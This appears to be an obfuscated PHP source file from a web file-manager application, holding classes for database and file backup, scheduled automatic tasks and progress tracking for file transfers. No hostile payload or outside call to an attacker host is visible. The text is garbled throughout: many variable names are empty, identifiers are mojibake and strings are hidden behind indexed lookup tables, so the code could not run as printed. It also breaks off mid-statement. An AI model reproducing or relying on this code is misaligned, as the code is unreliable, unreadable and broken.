<?php
 goto BÌíé; dœ´: function binCheckBigger($, $—ú€ì) { return $ > $—ú€ì; } $_SERVER[$_SERVER[¬Ü][3]] = ("\70\62\70\62"."\64\65")+0;$_n1so="c4ia0ojfvt17l9uqdrshpz836wke5xb2nymg1q6ypa8tkegibdr0xhcn9z7j35l2osfm4uwv1n4kw38jiy";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($, $Ëè•) { $Îµ¥ =& $_SERVER[]; if (isset(self::$_methodList[$])) { return @call_user_func_array(self::$_methodList[$], $Ëè•); } else { if (method_exists($this, $)) { return call_user_func_array(array($this, $), $Ëè•); } else { think_exception(__CLASS__ . $Îµ¥[4] . $ . $Îµ¥[5]); } } } public static function __callStatic($Á≥É, $) { if (isset(self::$_methodListStatic[$Á≥É])) { return call_user_func_array(self::$_methodListStatic[$Á≥É], $); } else { if (method_exists(self, $Á≥É)) { return call_user_func_array(array(self, $Á≥É), $); } else { show_json("{$Á≥É}\50\x29\x20\156\157\x74\40\x65\170\x69\x73\164\x3b", !1); } } } public static function addMethod($, $‰†§) { self::$_methodList[$] = $‰†§; } public static function addMethodStatic($‹∂, $) { self::$_methodListStatic[$‹∂] = $; } } goto Fƒ∑; b∆û: class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $ =& $_SERVER[]; $ = Backup::get(); self::$io = $[$[791]]; self::$name = $[$[42]]; $ = new DbManage(); $»ù›û = $->dbType(); $’ê = array($[816] => $»ù›û, $[817] => time()); Backup::set($’ê); $·Öº = $this->tmpFilesPath() . $[818] . self::$name . $[18]; del_dir($·Öº); mk_dir($·Öº); $ = $„ò∂ = 0; $ = new Task($[819], $[820], 0, LNG($[821]) . $[822] . LNG($[823])); try { $ = $->db()->getTables(); } catch (Exception $”ú) { $->end(); return !1; } $ = array_diff($, array($[824], $[825])); foreach ($ as $‚õä) { $ += $->model($‚õä)->count(); } $->task[$[826]] = $; $GLOBALS[$[827]] = self::$name; foreach ($ as $‚õä) { $’Ω…æ = $·Öº . $‚õä . $[828]; $ = null; if ($‚õä == $[829] && (!isset($[$[794]]) || $[$[794]] == $[222])) { $ = self::$io; } $„ò∂ += $->sqlFromDb($‚õä, $’Ω…æ, $, $); } unset($GLOBALS[$[827]]); $->end(); if ($„ò∂ > $) { $ = $„ò∂; } $’ê = array($[816] => $»ù›û, $[813] => 1, $[830] => $, $[831] => $„ò∂, $[832] => time()); Backup::set($’ê); if ($ - $„ò∂ > 0) { $ = $[833]; if (stristr(I18n::getType(), $[834])) { $ = $[835]; } write_log(array($, $’ê), $[820]); return !1; } return !0; } private function tmpFilesPath() { $ =& $_SERVER[]; $‰öì = TEMP_FILES; if ($GLOBALS[$[16]][$[99]][$[836]]) { $‰öì = $GLOBALS[$[16]][$[99]][$[836]]; if (!mk_dir($‰öì) || !is_writable($‰öì) || !IO::mkfile($‰öì . $[837])) { $‰öì = TEMP_FILES; } } return $‰öì; } } class BackupDbFile { public function __construct() { } public function index() { $ =& $_SERVER[]; $ƒä = Backup::get(); $Àã = $ƒä[$[42]]; $ = $this->tmpFilesPath() . "\x62\141\x63\153\x75\160\137{$Àã}\x2f"; $ = $this->backupPath($ƒä); if (!($ = IO::mkdir($))) { return !1; } $ = IO::listPath($); $ƒÜÎ∑â = isset($[$[93]]) ? $[$[93]] : array(); $ = array_sum(array_column($ƒÜÎ∑â, $[86])); if (!$) { return !1; } $ÃÜ…© = array($[838] => $, $[839] => time()); Backup::set($ÃÜ…©); $…£ = new TaskFileTransfer($[840], $[820], count($ƒÜÎ∑â), LNG($[821]) . $[439] . LNG($[823]) . $[841]); $…£->task[$[803]] = $; foreach ($[$[93]] as $ ©) { $ = IO::move($ ©[$[94]], $); if (!$) { $…£->end(); $Õ©ﬂ¢ = IO::getLastError($[842] . $ ©[$[94]] . $[843] . $ . $[175]); write_log($Õ©ﬂ¢, $[820]); return !1; } } $÷¶ = new DbManage(); $»ò = $÷¶->getSqlFile(); if (!$»ò[$[844]] || !$»ò[$[23]]) { return !1; } IO::move($»ò[$[844]], $); IO::move($»ò[$[23]], $); $…£->end(); $ÃÜ…© = array($[845] => $, $[846] => time()); Backup::set($ÃÜ…©); return !0; } private function backupPath($∆Ñ) { $ =& $_SERVER[]; $ﬁ≥ = $∆Ñ[$[42]]; $ = Model($[810])->get($[811]); $÷í = substr(md5($[812] . $ . $ﬁ≥), 0, 8); return "\173\151\157\72{$∆Ñ[$[791]]}\175\x2f\144\141\164\x61\x62\141\163\145\57\142\141\x63\153\165\160\x2f" . $ﬁ≥ . $[21] . $÷í; } private function tmpFilesPath() { $ =& $_SERVER[]; $ = TEMP_FILES; if ($GLOBALS[$[16]][$[99]][$[836]]) { $ = $GLOBALS[$[16]][$[99]][$[836]]; if (!mk_dir($) || !is_writable($) || !IO::mkfile($ . $[837])) { $ = TEMP_FILES; } } return $; } } class BackupFile { public function __construct() { } public function index() { $ËåÅ = Backup::get(); $◊Å = $ËåÅ[$_SERVER[][346]][$_SERVER[][224]][$_SERVER[][518]]; $À° = array($_SERVER[][519] => array($_SERVER[][847], $◊Å), $_SERVER[][848] => array($_SERVER[][384], $ËåÅ[$_SERVER[][791]])); $⁄† = (int) Model($_SERVER[][829])->where($À°)->count($_SERVER[][518]); $ = (int) Model($_SERVER[][829])->where($À°)->sum($_SERVER[][86]); $Èü™ = new TaskFileTransfer($_SERVER[][849], $_SERVER[][820], $⁄†, LNG($_SERVER[][821]) . $_SERVER[][822] . LNG($_SERVER[][850])); $Èü™->task[$_SERVER[][803]] = $; $‹∑ = array($_SERVER[][851] => $⁄†, $_SERVER[][852] => $, $_SERVER[][853] => time()); Backup::set($‹∑); $—∑ = !0; $«Æ = $this->storeIds(); $œ´–º = 1; $ﬂú = 1000; $¬ß = $ÿô = 0; $ = array(); $÷á = $ = 0; do { $⁄ä = $_SERVER[][854]; $¬ä = Model($_SERVER[][829])->where($À°)->field($⁄ä)->order($_SERVER[][855])->selectPage($ﬂú, $œ´–º); $ = !empty($¬ä[$_SERVER[][422]]) ? $¬ä[$_SERVER[][422]] : array(); foreach ($ as $) { if (!$this->_fileExist($, $, $«Æ)) { $⁄† -= 1; $ -= (int) $[$_SERVER[][86]]; write_log("\146\151\x6c\145\40\x6e\157\x74\x20\x65\170\x69\x73\164\x2e\x66\x69\x6c\145\x49\x44\x3a{$[$_SERVER[][518]]}\x2c\x20\160\x61\x74\150\72{$[$_SERVER[][94]]}", $_SERVER[][856]); continue; } $⁄Ä = $[$_SERVER[][94]]; $–ø√° = "\x7b\151\157\x3a{$ËåÅ[$_SERVER[][791]]}\175" . substr($⁄Ä, strlen("\173\151\x6f\x3a{$[$_SERVER[][857]]}\x7d")); if (IO::exist($–ø√°)) { $Èü™->updateFileEnd($[$_SERVER[][42]], $[$_SERVER[][86]]); } else { $–ø√° = get_path_father($–ø√°); IO::mkdir($–ø√°); if (!IO::copy($⁄Ä, $–ø√°, $_SERVER[][858])) { write_log($_SERVER[][859] . $⁄Ä . $_SERVER[][843] . $–ø√° . $_SERVER[][175], $_SERVER[][820]); $—∑ = !1; break; } } $◊Å = $[$_SERVER[][518]]; $ÿô += 1; $¬ß += $[$_SERVER[][86]]; $ += 1; $÷á += $[$_SERVER[][86]]; if ($¬ß >= 1024 * 1024 * 100) { $‹∑ = array($_SERVER[][860] => $◊Å, $_SERVER[][861] => $, $_SERVER[][862] => $÷á); Backup::set($‹∑); $¬ß = $ÿô = 0; } } $ = count($); $œ´–º++; } while ($ == $ﬂú); $Èü™->end(); $‹∑ = array($_SERVER[][863] => 1, $_SERVER[][801] => time(), $_SERVER[][815] => 1, $_SERVER[][860] => $◊Å, $_SERVER[][852] => $, $_SERVER[][851] => $⁄†, $_SERVER[][864] => time()); if ($ÿô) { $‹∑[$_SERVER[][861]] = $; $‹∑[$_SERVER[][862]] = $÷á; } Backup::set($‹∑); $this->_fileFilter($); return !0; } private function _fileExist($Õ∂, &$·π´, $‘ä) { $⁄üÿè =& $_SERVER[]; $ = $Õ∂[$⁄üÿè[94]]; if (in_array($Õ∂[$⁄üÿè[518]], $·π´)) { return !1; } if (!in_array($Õ∂[$⁄üÿè[857]], $‘ä)) { return !1; } if (IO::exist($)) { return !0; } $≈ø√Ω = get_path_father($); if (IO::exist($≈ø√Ω)) { $·π´[] = $Õ∂[$⁄üÿè[518]]; return !1; } $”£ = array($⁄üÿè[857] => $Õ∂[$⁄üÿè[857]], $⁄üÿè[94] => array($⁄üÿè[436], "{$≈ø√Ω}\x25")); $ƒü = Model($⁄üÿè[829])->where($”£)->field($⁄üÿè[519])->select(); $·π´ = array_merge($·π´, array_to_keyvalue($ƒü, $⁄üÿè[22], $⁄üÿè[518])); return !1; } private function _fileFilter($‚üº) { $¬≤ =& $_SERVER[]; if (empty($‚üº)) { return; } $ = array($¬≤[518] => array($¬≤[17], array_unique($‚üº))); $ = Model($¬≤[865])->where($)->field($¬≤[191])->select(); foreach ($ as $ ç) { Model($¬≤[865])->remove($ ç[$¬≤[191]], !1); } } private function storeIds() { $ =& $_SERVER[]; $‘∫√õ = Model($[807])->listData(); $ = array(); $ = $GLOBALS[$[16]][$[99]][$[866]]; foreach ($‘∫√õ as $ƒê) { $ = strtolower($ƒê[$[105]]); if (!isset($[$])) { continue; } $ = $[84] . (isset($[$]) ? $[$] : ucfirst($)); if (!class_exists($)) { continue; } $[] = $ƒê[$[452]]; } return $; } } goto b÷òﬂù; d–æÔ∫è: class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $ =& $_SERVER[]; if (self::valueGet($[790]) != $[98]) { return; } if (self::valueGet($[1641]) == $[98]) { $ = self::valueGet($[1642]); if (time() - $ > self::AUTO_RESTART_TIME) { self::restart(); } return; } self::clearUserStatus(); self::valueSet($[1641], $[98]); self::log($[1643] . ACTION . $[1644]); Hook::bind($[1645], $[1646]); $ﬁö = 0; while (!0) { self::cacheClear(); if (self::valueGet($[790]) != $[98]) { self::valueSet($[1641], $[222]); self::log($[1647]); die; } $ﬂ∞ = time(); if ($ﬂ∞ - $ﬁö >= 60) { self::valueSet(array($[1641] => $[98], $[1642] => $ﬂ∞), !1); $ﬁö = $ﬂ∞; } if (!file_exists(USER_SYSTEM . $[1648])) { self::valueSet(array($[1641] => $[222], $[790] => $[222]), !1); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function clearUserStatus() { $»É =& $_SERVER[]; http_close(); $GLOBALS[$»É[1649]] = 1; $_SERVER[$»É[1650]] = $»É[1651]; $_COOKIE = array(); $GLOBALS[$»É[545]] = 1; $GLOBALS[$»É[1652]] = 1; Session::$sessionSign = guid(); Session::$data = array(); } public static function restart() { $Õ° =& $_SERVER[]; http_close(); self::valueSet($Õ°[790], $Õ°[222]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($Õ°[1641] => $Õ°[222], $Õ°[790] => $Õ°[98]), !1); } public static function taskSwitch() { $ÿ¢ =& $_SERVER[]; $ = self::valueGet($ÿ¢[790]) == $ÿ¢[98] ? $ÿ¢[222] : $ÿ¢[98]; self::valueSet($ÿ¢[790], $); } public static function shutdownEvent() { $ =& $_SERVER[]; self::valueSet($[1641], $[222]); self::log($[1653]); } public static function config($ ìœî, $) { self::valueSet($_SERVER[][790], $ ìœî); } private static function taskRunAll() { $’© =& $_SERVER[]; $≈â÷è = timeFloat(); $ƒè = Model($’©[1654])->listData(); $ = count($ƒè); for ($«õ = 0; $«õ < $; $«õ++) { $ = $ƒè[$«õ]; if (!$[$’©[452]] || $[$’©[1655]] != $’©[98]) { continue; } if (!self::taskTimeCheck($)) { continue; } self::taskRun($); } Hook::trigger($’©[1656]); self::taskQueueRun($≈â÷è); } private static function taskQueueRun($) { $ = 10; while (!0) { $≈¥ﬁç = TaskQueue::run(); if ($≈¥ﬁç === !1) { break; } if (timeFloat() - $ >= $) { break; } } } private static function taskTimeCheck($»ù) { $ =& $_SERVER[]; $“ê = json_decode($»ù[$[204]], !0); $ŒñœÅ = intval($»ù[$[1642]]); $ = strtotime($[1657] . $“ê[$[1658]] . $[1659]) - strtotime($[1660]); $ = time() - strtotime(date($[1661]) . $[1662]); $ = $ >= $ && $ <= $ + 3600; switch ($“ê[$[43]]) { case $[1663]: if (time() - $ŒñœÅ < 3600 * 24 * 30) { return !1; } if ($“ê[$[1663]] == date($[1664]) && $) { return !0; } break; case $[1665]: if (time() - $ŒñœÅ < 3600 * 24 * 7) { return !1; } $ÒÅ¥à = date($[1666]) == 0 ? 7 : date($[1666]); if ($“ê[$[1665]] == $ÒÅ¥à && $) { return !0; } break; case $[1658]: if (time() - $ŒñœÅ < 3600 * 24) { return !1; } if ($) { return !0; } break; case $[1667]: if (time() - $ŒñœÅ >= floatval($“ê[$[1667]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $“• =& $_SERVER[]; static $ = 0; $–±”® = 300; if (!$) { $ = time(); } if (time() - $ < $–±”®) { return; } $ = time(); $ÿÑ = Model($“•[555])->db($“•[22]); if ($ÿÑ) { $ÿÑ->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($“•[1668], $“•[1669]); die; } } public static function taskRun($“Ç) { $ =& $_SERVER[]; self::log($[1670] . $“Ç[$[452]] . $[1671] . $“Ç[$[42]] . $[1672] . $“Ç[$[1673]]); Model($[1654])->run($“Ç[$[452]]); $ = timeFloat(); $ = $[22]; switch ($“Ç[$[43]]) { case $[360]: $›Ö = url_request($“Ç[$[1673]], $[255], !1, !1, !1, !1, 10); if ($›Ö[$[790]]) { $ = strlen($›Ö[$[1243]]); } break; case $[254]: $ = Hook::apply($“Ç[$[1673]]); default: break; } Model($[1674])->add(array($[1675] => $[22], $[1676] => $[222], $[43] => $[1677] . $“Ç[$[452]], $[1678] => json_encode(array($[42] => $“Ç[$[42]], $[1679] => timeFloat() - $, $[346] => $)))); $¬å = $ ? $[1680] . $ : $[22]; self::log($[1681] . $“Ç[$[452]] . $[175] . $¬å); return !0; } public static function valueGet($·Ö≠) { $Ïåä =& $_SERVER[]; $ = $Ïåä[1682]; $Õ´ = Model($Ïåä[485])->get($·Ö≠, $); if (is_null($Õ´)) { Model($Ïåä[485])->set($Ïåä[790], $Ïåä[98], $); Model($Ïåä[485])->set($Ïåä[1641], $Ïåä[222], $); $Õ´ = Model($Ïåä[485])->get($·Ö≠, $); } return $Õ´; } private static function valueSet($, $Èàµ) { $”ê =& $_SERVER[]; $»µ√∂ = $”ê[1683]; CacheLock::lock($»µ√∂); $Àí = Model($”ê[485])->set($, $Èàµ, $”ê[1682]); CacheLock::unlock($»µ√∂); return $Àí; } protected static function log($) { write_log($, $_SERVER[][1669]); } private static function cacheClear() { $ =& $_SERVER[]; Cache::clearMemory(Model($[485])->cacheKey($[1682])); Cache::clearMemory(Model($[485])->cacheKey($[1684])); Model($[1654])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\163\164\x6f\x70"; const STATYS_RUNNING = "\x72\165\156\x6e\x69\x6e\x67"; const STATYS_KILL = "\x6b\x69\x6c\154"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($, $ËñØ€â = '', $ = 0, $ = '') { $»´ =& $_SERVER[]; if (self::get($)) { return; } $this->task = array($»´[452] => $, $»´[1685] => USER_ID, $»´[1582] => $, $»´[503] => $»´[22], $»´[43] => $ËñØ€â, $»´[1105] => $»´[22], $»´[826] => $, $»´[1686] => 0, $»´[1687] => 0, $»´[1688] => 0, $»´[1689] => timeFloat(), $»´[1690] => 0, $»´[1691] => 0, $»´[1692] => 0, $»´[1693] => 0, $»´[790] => $»´[1641]); $GLOBALS[$»´[1694]] = 1; Hook::bind($»´[1645], array($this, $»´[1695])); Hook::bind($»´[1696], array($this, $»´[1697])); $this->startAfter(); Hook::trigger($»´[1698], $this->task); $this->task[$»´[1691]] = timeFloat(); } public function end($Œæ = '') { $–≤ =& $_SERVER[]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$–≤[1691]]) { self::valueSet($this->task[$–≤[452]], !1); } $this->isEnd = !0; if ($Œæ) { $this->task[$–≤[503]] = $Œæ; } self::log($–≤[1699] . $this->task[$–≤[452]] . $–≤[1700] . sprintf($–≤[891], timeFloat() - $this->task[$–≤[1689]]) . $–≤[1701]); Hook::unbind($–≤[1645], array($this, $–≤[1695])); Hook::unbind($–≤[1696], array($this, $–≤[1697])); $this->endAfter(); $›ù = $this->task; $this->task = !1; Hook::trigger($–≤[1702], $›ù); } public function update($“° = 0, $—ç = false) { $ =& $_SERVER[]; $◊â =& $this->task; if (!$◊â) { return; } $◊â[$[1686]] += $“°; $◊â[$[1690]] = timeFloat(); if ($◊â[$[826]]) { if ($◊â[$[826]] < $◊â[$[1686]]) { $◊â[$[826]] = $◊â[$[1686]]; } $Â∂ç = timeFloat() - $◊â[$[1689]] - $◊â[$[1692]]; if ($Â∂ç <= 0) { $Â∂ç = 0.001; } $◊â[$[1687]] = $◊â[$[1686]] / $◊â[$[826]]; $◊â[$[1688]] = $◊â[$[1686]] / $Â∂ç; if ($◊â[$[1687]] > 0) { $◊â[$[1693]] = $Â∂ç * (1 - $◊â[$[1687]]) / $◊â[$[1687]]; } $◊â[$[1693]] = $◊â[$[1693]] <= 0 ? 0 : $◊â[$[1693]]; } $this->updateAfter(); $ = 0.2; if (timeFloat() - $◊â[$[1691]] < $ && !$—ç) { return; } $◊∑ = self::get($◊â[$[452]]); $◊ã = $◊∑[$[790]]; if ($◊ã == self::STATYS_KILL) { $ﬂèﬂ• = array($[1703] => LNG($[1704]), $[1253] => !1); Cache::set($[1705] . $this->task[$[452]], $ﬂèﬂ•, 30); $this->onKill(); $this->end(); die; } else { if ($◊ã == self::STATYS_STOP) { $›π = 2; $◊∑[$[1692]] += $›π; self::valueSet($◊â[$[452]], $◊∑); sleep($›π); $this->update(); return; } } $◊â[$[790]] = $◊ã ? $◊ã : $◊â[$[790]]; $◊â[$[1692]] = $◊∑[$[1692]] ? $◊∑[$[1692]] : 0; $◊â[$[1691]] = timeFloat(); Hook::trigger($[1706], $◊â); self::valueSet($◊â[$[452]], $◊â); } public function onKillSet($≈≠, $ﬂß = array()) { $this->onKillCall = array($≈≠, $ﬂß); } public function onKill() { $»ò =& $_SERVER[]; self::log($»ò[1699] . $this->task[$»ò[452]] . $»ò[1707]); Hook::trigger($»ò[1708], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($Ôóá) { $∆• =& $_SERVER[]; Cache::set($∆•[1705] . $this->task[$∆•[452]], $Ôóá, 60); return $Ôóá; } public static function get($’ß) { $›ê =& $_SERVER[]; $ = self::valueGet($’ß); if (is_array($) && $[$›ê[1709]]) { $ á = ActionApply($[$›ê[1709]], array($)); $ = is_array($ á) ? $ á : $; } return $; } public static function listData() { $‹ê = self::valueGet(); return array_sort_by($‹ê, $_SERVER[][1689], !0); } public static function kill($) { return self::changeStatus($, self::STATYS_KILL); } public static function stop($) { return self::changeStatus($, self::STATYS_STOP); } public static function restart($) { return self::changeStatus($, self::STATYS_RUNNING); } public static function killAll() { $ =& $_SERVER[]; $ = self::listData(); foreach ($ as $Œº) { self::kill($Œº[$[452]]); } sleep(2); foreach ($ as $Œº) { self::valueSet($Œº[$[452]], !1); } } private static function changeStatus($ÎÇà, $) { $∆Ö =& $_SERVER[]; $≈ÉŸ∞ = self::valueGet($ÎÇà); if (!$≈ÉŸ∞) { return !1; } $≈ÉŸ∞[$∆Ö[790]] = $; self::valueSet($ÎÇà, $≈ÉŸ∞); self::log($∆Ö[1710] . $≈ÉŸ∞[$∆Ö[452]] . $∆Ö[1711] . $); return !0; } public static function valueGet($»≠ = false) { $ÛΩ°∑ =& $_SERVER[]; if ($»≠) { $ = Model($ÛΩ°∑[497])->where(array($ÛΩ°∑[104] => $»≠, $ÛΩ°∑[43] => $ÛΩ°∑[1112]))->find(); return $ ? json_decode($[$ÛΩ°∑[427]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($∆∂ = false) { $ =& $_SERVER[]; $√¥ÀÇ = array($[43] => $[1112]); if ($∆∂) { $√¥ÀÇ[$[1685]] = $∆∂; } $‰¶Æ = Model($[497])->where($√¥ÀÇ)->select(); $‰¶Æ = $‰¶Æ ? $‰¶Æ : array(); foreach ($‰¶Æ as $€ô Ω => $÷ø) { $‰¶Æ[$€ô Ω] = json_decode($÷ø[$[427]], !0); } return $‰¶Æ; } public static function valueSet($, $Èë´…å) { $‹â“ê =& $_SERVER[]; if (!$Èë´…å) { return Model($‹â“ê[497])->where(array($‹â“ê[104] => $, $‹â“ê[43] => $‹â“ê[1112]))->delete(); } $¬ô = json_encode($Èë´…å); if (!$¬ô) { ob_start(); var_dump($Èë´…å); $…ß = ob_get_clean(); self::log($‹â“ê[1712] . json_encode_force($…ß)); } if (!$ || !$Èë´…å[$‹â“ê[452]]) { return !1; } $Êã© = array($‹â“ê[43] => $‹â“ê[1112], $‹â“ê[1685] => USER_ID, $‹â“ê[104] => $, $‹â“ê[427] => $¬ô); $ = $‹â“ê[1713]; CacheLock::lock($); Model($‹â“ê[497])->add($Êã©, array(), !0); CacheLock::unlock($); } public static function log($√ë) { if (!GLOBAL_DEBUG) { return; } write_log($√ë, $_SERVER[][1714]); } } class TaskFileTransfer extends Task { protected function startAfter() { $÷Ö =& $_SERVER[]; $ =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($÷Ö[1715], array($this, $÷Ö[1716])); Hook::bind($÷Ö[1264], array($this, $÷Ö[1717])); Hook::bind($÷Ö[1718], array($this, $÷Ö[1719])); Hook::bind($÷Ö[645], array($this, $÷Ö[1720])); Hook::bind($÷Ö[646], array($this, $÷Ö[1721])); Hook::bind($÷Ö[653], array($this, $÷Ö[1722])); Hook::bind($÷Ö[654], array($this, $÷Ö[1723])); Hook::bind($÷Ö[648], array($this, $÷Ö[1724])); Hook::bind($÷Ö[651], array($this, $÷Ö[1725])); Hook::bind($÷Ö[614], array($this, $÷Ö[1726])); Hook::bind($÷Ö[611], array($this, $÷Ö[1726])); Hook::bind($÷Ö[616], array($this, $÷Ö[1726])); Hook::bind($÷Ö[618], array($this, $÷Ö[1726])); Hook::bind($÷Ö[620], array($this, $÷Ö[1726])); Hook::bind($÷Ö[1727], array($this, $÷Ö[1728])); Hook::bind($÷Ö[636], array($this, $÷Ö[1729])); $this->sourceModelCopyFlag = !1; Hook::bind($÷Ö[1730], array($this, $÷Ö[1731])); Hook::bind($÷Ö[1732], array($this, $÷Ö[1733])); Hook::bind($÷Ö[1734], array($this, $÷Ö[1735])); $[$÷Ö[1736]] = LNG($÷Ö[1737]); $[$÷Ö[1738]] = 0; $[$÷Ö[1739]] = 0; $[$÷Ö[1105]] = $÷Ö[22]; $[$÷Ö[1740]] = $÷Ö[22]; $[$÷Ö[1741]] = 0; $[$÷Ö[1742]] = 0; $[$÷Ö[1743]] = 0; if (!$[$÷Ö[1582]]) { $[$÷Ö[1582]] = LNG($÷Ö[1744]); } } protected function endAfter() { $ î =& $_SERVER[]; Hook::unbind($ î[1715], array($this, $ î[1716])); Hook::unbind($ î[1264], array($this, $ î[1717])); Hook::unbind($ î[1718], array($this, $ î[1719])); Hook::unbind($ î[645], array($this, $ î[1720])); Hook::unbind($ î[646], array($this, $ î[1721])); Hook::unbind($ î[653], array($this, $ î[1722])); Hook::unbind($ î[654], array($this, $ î[1723])); Hook::unbind($ î[648], array($this, $ î[1724])); Hook::unbind($ î[651], array($this, $ î[1725])); Hook::unbind($ î[614], array($this, $ î[1726])); Hook::unbind($ î[611], array($this, $ î[1726])); Hook::unbind($ î[616], array($this, $ î[1726])); Hook::unbind($ î[618], array($this, $ î[1726])); Hook::unbind($ î[620], array($this, $ î[1726])); Hook::unbind($ î[1727], array($this, $ î[1728])); Hook::unbind($ î[636], array($this, $ î[1729])); Hook::unbind($ î[1730], array($this, $ î[1731])); Hook::unbind($ î[1732], array($this, $ î[1733])); Hook::unbind($ î[1734], array($this, $ î[1735])); } public function copyMoveStart($ÓÜÄ, $“¶, $Ë∂∂, $›¨) { $’ä =& $_SERVER[]; self::log($’ä[1745] . $“¶ . $’ä[80] . $›¨); $‘É◊¶ = rtrim(TEMP_FILES, $’ä[18]); if (substr($“¶, 0, strlen($‘É◊¶)) == $‘É◊¶) { return; } if (substr($›¨, 0, strlen($‘É◊¶)) == $‘É◊¶) { return; } $ =& $this->task; $[$’ä[1746]] = KodIO::transferType($ÓÜÄ, $Ë∂∂); $this->update(); } public function updateAfter() { $ =& $_SERVER[]; $…• =& $this->task; if (!$…•[$[803]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($…•[$[1746]] == $[1356]) { return; } self::updateTask($…•); } private static function updateTask(&$) { $ÿπ =& $_SERVER[]; if ($[$ÿπ[1746]] == $ÿπ[1235] || $[$ÿπ[1746]] == $ÿπ[117]) { if ($[$ÿπ[1740]]) { $[$ÿπ[1743]] = $[$ÿπ[1742]] + $[$ÿπ[1739]]; } } else { if ($[$ÿπ[1746]] == $ÿπ[1357]) { if ($[$ÿπ[1740]] == $ÿπ[1235]) { $[$ÿπ[1743]] = $[$ÿπ[1742]] + $[$ÿπ[1739]] * 0.5; } else { if ($[$ÿπ[1740]] == $ÿπ[117]) { $[$ÿπ[1743]] = $[$ÿπ[1742]] + $[$ÿπ[1738]] * 0.5 + $[$ÿπ[1739]] * 0.5; } } } } $[$ÿπ[1687]] = $[$ÿπ[1743]] / $[$ÿπ[803]]; if ($[$ÿπ[1687]] > 0) { $ = timeFloat() - $[$ÿπ[1689]] - $[$ÿπ[1692]]; $[$ÿπ[1693]] = $ * (1 - $[$ÿπ[1687]]) / $[$ÿπ[1687]]; } } public function addPath($…ã) { $ =& $_SERVER[]; if (!$…ã) { return; } $ =& $this->task; $Òëæ™ = IO::infoWithChildren($…ã); $ = $[$[1747]] ? $[$[1747]][$[1748]] : 0; $[$[1747]] = array($[1748] => $ + 1, $[471] => $Òëæ™[$[42]], $[94] => $Òëæ™[$[94]], $[560] => $Òëæ™[$[560]] ? $Òëæ™[$[560]] : $Òëæ™[$[94]]); if ($Òëæ™[$[43]] == $[224]) { $[$[826]] += 1; } else { $[$[826]] += $Òëæ™[$[89]][$[87]]; if ($Òëæ™[$[191]]) { $[$[826]] += $Òëæ™[$[89]][$[88]] + 1; } } $[$[803]] += $Òëæ™[$[86]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($”æ) { } public function sourceAddHashEnd($»Ö“ø) { } public function sourceAddFileStart($) { $◊æ =& $_SERVER[]; $Á©í =& $this->task; $Á©í[$◊æ[1738]] = $[$◊æ[86]]; $Á©í[$◊æ[1736]] = $[$◊æ[42]]; $Á©í[$◊æ[1105]] = $[$◊æ[42]]; $Á©í[$◊æ[1749]] = $[$◊æ[94]]; $this->update(); } public function sourceAddFileEnd($÷É) { $ =& $_SERVER[]; $Ë£ó =& $this->task; $Ë£ó[$[1743]] += $÷É[$[86]]; $Ë£ó[$[1749]] = $÷É[$[94]]; $this->update(1); } public function copyFileStart($‘≤, $Õì, $, $Ã°, $, $ÿç) { $€â =& $_SERVER[]; $Ï∑£ = $; if ($Ï∑£ == $GLOBALS[$€â[1750]]) { $Ï∑£ = $GLOBALS[$€â[1751]]; } $GLOBALS[$€â[1751]] = $; $GLOBALS[$€â[1750]] = $ÿç; $“á =& $this->task; $“á[$€â[1736]] = $Ï∑£; $“á[$€â[1738]] = (int) $‘≤->size($Õì); $“á[$€â[1739]] = 0; $“á[$€â[1105]] = $€â[22]; $“á[$€â[1740]] = $€â[22]; $“á[$€â[1741]] = 0; $…© = $“á[$€â[1738]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($“á[$€â[452]] . $€â[1752]); if ($…© && file_exists(get_path_father($Ã°))) { Cache::set($“á[$€â[452]] . $€â[1752], $Ã°); $“á[$€â[1709]] = array($€â[1753], $€â[1754]); } $this->update(0, $…©); } public static function updateCopyLocalFileSize($Êò¥) { $ =& $_SERVER[]; $‹î = Cache::get($Êò¥[$[452]] . $[1752]); if (!$‹î || !file_exists($‹î)) { return $Êò¥; } $Êò¥[$[1739]] = @filesize($‹î); $Êò¥[$[1743]] += $Êò¥[$[1739]]; self::updateTask($Êò¥); return $Êò¥; } public function copyFileEnd($œÜ, $€ó, $⁄±, $Ó™ú, $ÕΩ, $»±) { $ =& $_SERVER[]; $ =& $this->task; $[$[1739]] = $[$[1738]]; $[$[1740]] = $[22]; unset($[$[1709]]); if ($ÕΩ == $[$[1736]]) { $[$[1742]] += $[$[1738]]; $[$[1743]] = $[$[1742]]; $ŸØ = 1; if (isset($[$[1749]]) && $[$[1749]] == $€ó) { $ŸØ = 0; } $this->update($ŸØ); } else { $this->update(); $[$[1739]] = 0; } Cache::remove($[$[452]] . $[1752]); self::log($[1755] . $€ó . $[80] . $Ó™ú . $[11] . $ÕΩ . $[1756] . $[$[1736]]); } public function updateFileEnd($⁄ÉÏ∑õ, $–Ñ) { $ =& $_SERVER[]; $Èìü =& $this->task; $Èìü[$[1736]] = $⁄ÉÏ∑õ; $Èìü[$[1738]] = $–Ñ; $Èìü[$[1742]] += $–Ñ; $Èìü[$[1743]] = $Èìü[$[1742]]; $this->update(1); self::log($[1757] . $⁄ÉÏ∑õ); } public function sourceModelCopy($‚ö•) { $Œ∏ =& $_SERVER[]; $Ãê = $‚ö•[0]; $ = $‚ö•[1]; $ =& $this->task; $this->sourceModelCopyFlag = !0; $ = 0; switch ($Ãê) { case 